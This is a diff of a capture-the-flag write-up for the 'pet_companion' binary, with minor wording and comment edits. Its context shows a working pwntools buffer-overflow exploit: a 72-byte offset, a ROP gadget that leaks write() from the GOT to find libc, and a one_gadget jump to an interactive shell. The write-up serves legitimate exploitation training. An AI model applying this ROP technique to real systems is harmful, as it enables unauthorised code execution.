@@ -32,6 +32,7 @@ $ checksec pet_companion
 Note that ``Stack Canaries`` and ``PIE`` are disabled so we can potentially leverage a ``Stack Buffer Overflow`` easily and leak addresses statically from within the `ELF` file.
 
 ```c
+/* decompilation from Ghidra */
 undefined8 main(void)
 
 {
@@ -62,7 +63,7 @@ undefined8 main(void)
 
 ## Finding the bug
 
-Basically the program reads up to `0x100` bytes from the user input and stores it in an 8 bytes sized variable, so there is notably a `Buffer Overflow` bug, we can corroborate it by running the program and insert a large string:
+Basically the program reads up to `0x100` bytes from the user input and stores it in an 8 bytes sized variable, so there is notably a `Buffer Overflow` bug, we can corroborate that by running the program and inserting a large string:
 
 ```
 $ ./pet_companion                                                              
@@ -109,7 +110,7 @@ Finding cyclic pattern of 8 bytes: b'jaaaaaaa' (hex: 0x6a61616161616161)
 Found at offset 72
 ```
 
-Before being able to call ``write()``, we have to find a gadget to set the register ``RSI`` with the address of ``write()`` in the ``GOT`` section, which will be treated as the first parameter of the function. I used ``ropper`` for that task.
+Before being able to call ``write()``, we have to find a gadget to set the register ``RSI`` with the address of ``write()`` in the ``GOT`` section, which will be treated as the first parameter of the function. I used ``ropper`` for the task.
 
 ```
 $ ropper --file pet_companion                                                  
@@ -128,7 +129,7 @@ Gadgets
 93 gadgets found
 ```
 
-That is the unique ``pop rsi`` gadget that ``ropper`` found, it comes with a ``pop r15`` so we will just put garbage in that register.
+That is the unique ``pop rsi`` gadget that ``ropper`` found, it comes with a ``pop r15`` so we will just put garbage in that register since we don't need it.
 
 For the last part of our exploit I will use the `one_gadget` tool to find a `One Gadget`:
 
@@ -181,6 +182,7 @@ io = start()
 #=-=-=- USE BOF TO LEAK LIBC -=-=-=
 
 pop_rsi_r15 = 0x400741
+
 # Set the first argument of the write function in register RSI
 # as the address of the same write function to leak its address,
 # set R15 to any value, then call write function and finally
@@ -191,6 +193,7 @@ payload = b"A"*72 + \
           p64(elf.sym.main)
 io.sendlineafter(b": ", payload)
 data =  io.recvuntil(b'[!] Set your pet companion\'s current status: ')
+
 # Extract the write address from the response and calculate the
 # libc base address by subtracting the write function offset
 # to the leaked address
@@ -208,6 +211,8 @@ io.sendline(b"A"*72 + p64(libc.address + 0x4f302))
 # Interact with the process
 io.interactive()
 ```
+
+Run the exploit with the ``REMOTE`` option to get the real flag. Don't forget to change the ip address and port of your docker container in the exploit script.
 
 ```
 $ ./xpl.py REMOTE                                                 
